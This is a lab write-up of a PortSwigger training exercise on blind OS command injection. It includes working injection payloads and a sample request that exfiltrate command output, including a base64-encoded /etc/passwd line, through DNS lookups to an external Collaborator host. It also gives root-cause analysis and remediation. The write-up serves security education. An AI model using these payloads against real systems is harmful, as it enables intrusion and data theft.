# Lab 05 — Blind OS Command Injection with Out-of-Band Data Exfiltration

## 1. Overview

| Field | Value |
|---|---|
| Vulnerability Class | OS Command Injection (Blind / Out-of-Band Data Exfiltration) |
| CWE | CWE-78 |
| Difficulty | Practitioner |
| Source | PortSwigger Web Security Academy |
| Objective | Execute `whoami` and exfiltrate its output via a DNS query to Burp Collaborator |

## 2. Summary

This lab builds on Lab 04: the same asynchronous, no-output, no-writable-path constraints apply. Here, instead of merely proving that a DNS lookup occurred, the goal is to actually **read the output** of an injected command purely through the OAST channel. This is achieved with **inline command substitution** (backticks or `$()`), which embeds a command's output into the domain name being looked up before the DNS query is sent.

## 3. Proof of Concept (PoC)

1. In Burp Suite Professional, open the **Collaborator** tab and click **Copy to clipboard** to generate a unique subdomain.
2. Submit the feedback form, capture `POST /feedback/submit`, and send it to Repeater.
3. Modify the `email` parameter to use inline command substitution so the `whoami` output becomes part of the looked-up domain:
   ```
   email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
   ```
4. Send the request (returns immediately — execution is asynchronous).
5. Return to the **Collaborator** tab and click **Poll now**.
6. Inspect the DNS interaction's **Description**/details to read the full domain that was resolved — the first label is the command's output.
7. Submit the recovered username as the lab's solution.

## 4. Evidence

**Injection request:**
```
POST /feedback/submit HTTP/2
Host: <lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=<token>&name=test&email=||nslookup+`whoami`.je3k2z1x9c1y2b3.oastify.com||&subject=test&message=test
```

**Collaborator interaction detail:**
```
Type: DNS
Interaction: A record lookup
Looked-up domain: peter-XXXXXX.je3k2z1x9c1y2b3.oastify.com
```

**Recovered value:** `peter-XXXXXX` (submitted as the lab's answer to mark it solved).

## 5. Root Cause Analysis

**Attacker perspective:** The shell evaluates `` `whoami` `` first, substituting it with the current username (e.g. `peter-123456`) before passing the resulting string to `nslookup`:
```
nslookup peter-123456.je3k2z1x9c1y2b3.oastify.com
```
The DNS resolution request travels out to the attacker-controlled Collaborator server, embedding the exfiltrated data directly in the subdomain label — a side channel that works even when every other output path (HTTP response, writable files) is unavailable.

**Defender perspective:** This demonstrates that "no visible output" and "no writable storage" are not sufficient mitigations on their own. As long as unsanitised input reaches a shell, any command — and its output — can be executed and exfiltrated via any permitted egress protocol, DNS being the most commonly overlooked one.

**Handling edge cases:**
- DNS labels cannot contain spaces or many special characters. For multi-word or binary output (e.g. file contents), base64-encode and strip whitespace first:
  ```
  nslookup $(cat /etc/passwd | head -n 1 | base64 | tr -d ' \n').COLLABORATOR-SUBDOMAIN
  ```
- If backticks are filtered, `$()` is a drop-in equivalent: `` ||nslookup $(whoami).COLLABORATOR-SUBDOMAIN|| ``.

## 6. Impact

This is full, confirmed arbitrary command execution with a reliable exfiltration channel, regardless of response visibility, writable storage, or HTTP/HTTPS egress restrictions. An attacker can progressively exfiltrate any readable file or command output from the compromised host, making this functionally equivalent in severity to verbose/in-band injection.

## 7. Remediation

- Same as Lab 04: eliminate the shell call, restrict/monitor outbound DNS resolution from application servers, and apply strict input validation.
- Deploy network-level detection for anomalous DNS query patterns (e.g. high-entropy subdomains, lookups to newly observed external domains) as a compensating control.
- Treat "blind" as a detection difficulty, not a severity reducer, when triaging and prioritizing remediation of command injection findings.

## 8. References

- [PortSwigger — Blind OS command injection with out-of-band data exfiltration](https://portswigger.net/web-security/os-command-injection)
- [Burp Collaborator documentation](https://portswigger.net/burp/documentation/collaborator)
- [CWE-78](https://cwe.mitre.org/data/definitions/78.html)
